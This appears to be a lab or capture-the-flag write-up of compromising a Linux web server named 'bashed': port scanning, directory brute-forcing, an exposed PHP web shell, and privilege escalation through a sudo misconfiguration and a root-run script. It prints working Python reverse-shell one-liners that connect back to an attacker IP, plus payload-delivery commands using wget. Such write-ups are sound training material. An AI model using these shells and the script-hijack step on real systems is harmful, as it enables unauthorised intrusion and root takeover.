## Nmap Port Scanning
```bash
┌──(saxon㉿Saxon)-[~/Desktop]
└─$ nmap -Pn -sV -T4 10.10.10.68 -p-
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-30 11:21 EDT
Nmap scan report for 10.10.10.68
Host is up (0.025s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.31 seconds
```
#### 80/tcp  http  Apache httpd 2.4.18 ((Ubuntu))
- <mark>Directory Brute-Forcing</mark>
	```bash
	┌──(saxon㉿Saxon)-[~/Desktop]
	└─$ gobuster dir -u http://10.10.10.68 -w /usr/share/wordlists/dirb/common.txt -r                                                                                                                 
	===============================================================
	Gobuster v3.5
	by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
	===============================================================
	[+] Url:                     http://10.10.10.68
	[+] Method:                  GET
	[+] Threads:                 10
	[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
	[+] Negative Status codes:   404
	[+] User Agent:              gobuster/3.5
	[+] Follow Redirect:         true
	[+] Timeout:                 10s
	===============================================================
	2023/08/30 11:29:13 Starting gobuster in directory enumeration mode
	===============================================================
	/.htaccess            (Status: 403) [Size: 295]
	/.hta                 (Status: 403) [Size: 290]
	/.htpasswd            (Status: 403) [Size: 295]
	/css                  (Status: 200) [Size: 1758]
	/dev                  (Status: 200) [Size: 1148]
	/fonts                (Status: 200) [Size: 2095]
	/images               (Status: 200) [Size: 1564]
	/index.html           (Status: 200) [Size: 7743]
	/js                   (Status: 200) [Size: 3165]
	/php                  (Status: 200) [Size: 939]
	/server-status        (Status: 403) [Size: 299]
	/uploads              (Status: 200) [Size: 14]
	Progress: 4515 / 4615 (97.83%)
	===============================================================
	2023/08/30 11:29:26 Finished
	===============================================================

	```
- We can find `phpbash.php` under /dev directory where `phpbash.php` is a standalone, semi-interactive web shell according to the GitHub description.
![[Pasted image 20230830114254.png]]
- <mark>Obtain Reverse Shell</mark>
	```bash
	#Within phpbash.php run following python command
	#For some reason the common bash reverse shell does not work
	python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.15",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
	#reverse shell listener
	nc -lnvp 8080
	```
- <mark>Post-Exploitation</mark>
	-  <mark>Upgrade Shell with following commands</mark>
	- asd
	```bash
	# In reverse shell
	python -c 'import pty; pty.spawn("/bin/bash")'
	Ctrl-Z
	# In Kali
	stty raw -echo;fg;reset
	# In reverse shell 
	export TERM=xterm-256
	```
	- <mark>Privilege Escalation</mark>
	```bash
	#misconfigured SUDO permission
	www-data@bashed:/home# sudo -l
	Matching Defaults entries for www-data on bashed:
	env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
	
	User www-data may run the following commands on bashed:
	(scriptmanager : scriptmanager) NOPASSWD: ALL
	```

	```bash
	#look for any diretories or files belongs to scriptmanager
	find / -group scriptmanager 2>/dev/null
	# Insteresting direotory and file
	scriptmanager@bashed:/scripts$  find / -group scriptmanager 2>/dev/null
	/scripts
	/scripts/test.py
	#Everything in the directory are executed per minute with root privilege
	-rw-r--r--  1 scriptmanager scriptmanager   58 Dec  4  2017 test.py
	-rw-r--r--  1 root          root            12 Aug 30 10:17 test.txt
	# set up webserver
	python3 -m http.server
	# get reverse shell with wget
	sudo -u scriptmanager rm test.py
	sudo -u scriptmanager wget http://10.10.14.15:8000/test.py 
	# Payload 
	import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.15",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
	```